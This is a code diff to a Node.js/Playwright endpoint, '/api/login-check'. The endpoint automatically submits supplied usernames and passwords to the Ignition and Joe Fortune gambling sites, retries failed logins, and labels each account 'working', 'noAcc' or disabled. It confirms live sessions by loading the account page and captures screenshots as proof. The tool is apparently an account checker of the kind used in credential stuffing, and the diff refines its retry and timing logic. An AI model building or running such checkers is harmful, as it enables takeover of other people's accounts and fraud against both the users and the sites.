@@ -598,95 +598,101 @@ app.post('/api/login-check', async (req, res) => {
     const filled = await fillLoginForm(page, username, password);
     if (!filled) note = 'Could not locate login form fields on page';
 
-    // Extra settle time so both fields are fully visible in the screenshot
-    await page.waitForTimeout(500);
-
-    // SCR 1/4 — both fields filled, ready to submit
+    // SCR 1/4 — 0.7s after the last field click (both fields now filled)
+    await page.waitForTimeout(700);
     shots[0] = await captureShot(page, 'SCR 1/4');
 
-    // ── Step 2–3: Submit with retry loop (up to MAX_LOGIN_ATTEMPTS) ───────
+    // ── Step 2: First submit → 0.9s → SCR 2/4 ────────────────────────────
     let respType = RESP.UNKNOWN;
     const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';
 
-    for (let attempt = 1; attempt <= MAX_LOGIN_ATTEMPTS; attempt++) {
-      // Re-fill credentials on retries (form may have cleared)
-      if (attempt > 1) {
-        await fillLoginForm(page, username, password);
-        await page.waitForTimeout(300);
-      }
+    const clicked1 = await clickSubmit(page);
+    if (!clicked1) await page.keyboard.press('Enter');
 
-      // Submit
-      const clicked = await clickSubmit(page);
-      if (!clicked) await page.keyboard.press('Enter');
+    // Wait 0.9s after the submit click then capture SCR 2/4
+    await page.waitForTimeout(900);
+    shots[1] = await captureShot(page, 'SCR 2/4');
 
-      // Poll up to 5 s for a known response
-      respType = await waitForLoginResponse(page);
-      await dismissCookiePopup(page);
+    // Now poll remaining time (~4.1s) to detect the response
+    respType = await waitForLoginResponse(page, 4100);
+    await dismissCookiePopup(page);
 
-      // Capture SCR 2/4 after first submit, SCR 3/4 after last retry
-      if (attempt === 1)                   shots[1] = await captureShot(page, 'SCR 2/4');
-      if (attempt === MAX_LOGIN_ATTEMPTS)  shots[2] = await captureShot(page, 'SCR 3/4');
-      if (respType === RESP.SUCCESS) {
-        outcome = 'working';
-        note = `${siteName} — login successful`;
-        break;
-      }
-      if (respType === RESP.PERM_DISABLED) {
-        outcome = 'permDisabled';
-        note = `${siteName} — account permanently disabled (contact Customer Service)`;
-        break;
-      }
-      if (respType === RESP.TEMP_DISABLED) {
-        outcome = 'tempDisabled';
-        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
-        break;
-      }
-      if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2) {
-        if (attempt === MAX_LOGIN_ATTEMPTS) {
-          outcome = 'noAcc';
-          note = `${siteName} — incorrect credentials after ${MAX_LOGIN_ATTEMPTS} attempts (account does not exist or wrong password)`;
-        }
-        // else: loop again for next attempt
-        continue;
-      }
-      // UNKNOWN: no pattern matched — stop retrying, fall through to fallback
-      break;
+    // Evaluate result after first attempt
+    if (respType === RESP.SUCCESS) {
+      outcome = 'working';
+      note = `${siteName} — login successful`;
+    } else if (respType === RESP.PERM_DISABLED) {
+      outcome = 'permDisabled';
+      note = `${siteName} — account permanently disabled (contact Customer Service)`;
+    } else if (respType === RESP.TEMP_DISABLED) {
+      outcome = 'tempDisabled';
+      note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
     }
 
-    // Take SCR 3/4 if not already captured (fewer than MAX_LOGIN_ATTEMPTS retries)
-    if (!shots[2]) shots[2] = await captureShot(page, 'SCR 3/4');
+    // ── Step 3: Retry submit (if needed) → 0.9s → SCR 3/4 ───────────────
+    if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2 || respType === RESP.UNKNOWN) {
+      // Re-fill and submit again
+      await fillLoginForm(page, username, password);
+      const clicked2 = await clickSubmit(page);
+      if (!clicked2) await page.keyboard.press('Enter');
 
-    // ── Step 4: Fallback account-page check ───────────────────────────────
-    // If outcome is still unclear (UNKNOWN response type), try navigating
-    // directly to the account page. If it loads without redirecting to login,
-    // the session is active → working.
-    if (respType === RESP.UNKNOWN || (respType !== RESP.SUCCESS && outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled')) {
-      try {
-        const accountUrl = site === 'ign'
-          ? loginUrl.replace(/\/login.*$/, '/account')
-          : 'https://joefortunepokies.win/account';
-        await page.goto(accountUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
-        await page.waitForTimeout(2000);
-        await dismissCookiePopup(page);
+      // Wait 0.9s after the retry click then capture SCR 3/4
+      await page.waitForTimeout(900);
+      shots[2] = await captureShot(page, 'SCR 3/4');
+
+      // Poll for response after retry
+      respType = await waitForLoginResponse(page, 4100);
+      await dismissCookiePopup(page);
+
+      if (respType === RESP.SUCCESS) {
+        outcome = 'working';
+        note = `${siteName} — login successful (attempt 2)`;
+      } else if (respType === RESP.PERM_DISABLED) {
+        outcome = 'permDisabled';
+        note = `${siteName} — account permanently disabled (contact Customer Service)`;
+      } else if (respType === RESP.TEMP_DISABLED) {
+        outcome = 'tempDisabled';
+        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
+      } else if (respType === RESP.WRONG_PASS_2) {
+        outcome = 'noAcc';
+        note = `${siteName} — incorrect credentials on retry (account does not exist or wrong password)`;
+      }
+    } else {
+      // Outcome already determined after attempt 1 — still take SCR 3/4
+      await page.waitForTimeout(900);
+      shots[2] = await captureShot(page, 'SCR 3/4');
+    }
+
+    // ── Step 4: Fallback account-page check → 0.9s → SCR 4/4 ────────────
+    // Navigates to the account page directly. If it loads without redirecting
+    // back to /login the session is active (logged in). This is the 4th click.
+    const needsFallback = outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled';
+    try {
+      const accountUrl = site === 'ign'
+        ? loginUrl.replace(/\/login.*$/, '/account')
+        : 'https://joefortunepokies.win/account';
+      await page.goto(accountUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
+      await dismissCookiePopup(page);
+
+      if (needsFallback) {
         const finalUrl = page.url().toLowerCase();
         if (!finalUrl.includes('/login') && !finalUrl.includes('/sign-in') && !finalUrl.includes('/signin')) {
           outcome = 'working';
-          note = 'Joe Fortune — account page loaded without redirect (fallback verification — logged in)';
+          note = `${siteName} — account page loaded without redirect (fallback — logged in)`;
         } else {
-          if (outcome !== 'noAcc') {
-            outcome = 'noAcc';
-            note = 'Joe Fortune — redirected back to login (not logged in)';
-          }
-        }
-      } catch (fallbackErr) {
-        if (outcome !== 'noAcc' && outcome !== 'permDisabled' && outcome !== 'tempDisabled') {
           outcome = 'noAcc';
-          note = `Fallback check failed: ${fallbackErr.message}`;
+          note = `${siteName} — redirected back to login (not logged in)`;
         }
+      }
+    } catch (fallbackErr) {
+      if (needsFallback) {
+        outcome = 'noAcc';
+        note = `Fallback check failed: ${fallbackErr.message}`;
       }
     }
 
-    // SCR 4/4 — final state
+    // SCR 4/4 — 0.9s after the account page goto (4th click)
+    await page.waitForTimeout(900);
     shots[3] = await captureShot(page, 'SCR 4/4');
 
   } catch (err) {
